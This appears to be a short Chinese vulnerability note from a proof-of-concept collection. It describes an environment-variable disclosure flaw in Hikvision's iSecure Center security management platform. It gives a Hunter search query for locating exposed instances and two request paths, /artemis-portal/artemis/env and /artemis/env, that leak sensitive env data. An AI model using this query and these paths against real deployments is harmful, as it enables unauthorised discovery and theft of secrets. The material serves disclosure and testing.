# 海康威视iSecure Center综合安防管理平台 env 信息泄漏漏洞

# 一、漏洞简介
HIKVISION 综合安防管理平台存在信息泄漏漏洞，攻击者通过漏洞可以获取环境env等敏感信息进一步攻击。

# 二、影响版本
+ HIKVISION 综合安防管理平台

# 三、<font style="color:rgb(0, 0, 0);">资产测绘</font>
**hunter查询语法：**

`app.name=="Hikvision 海康威视 iSecure Center"`


+ 登录页面


# 四、漏洞复现
```plain
/artemis-portal/artemis/env 
```


```plain
/artemis/env
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/swlt25g5lx4t9rg6>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
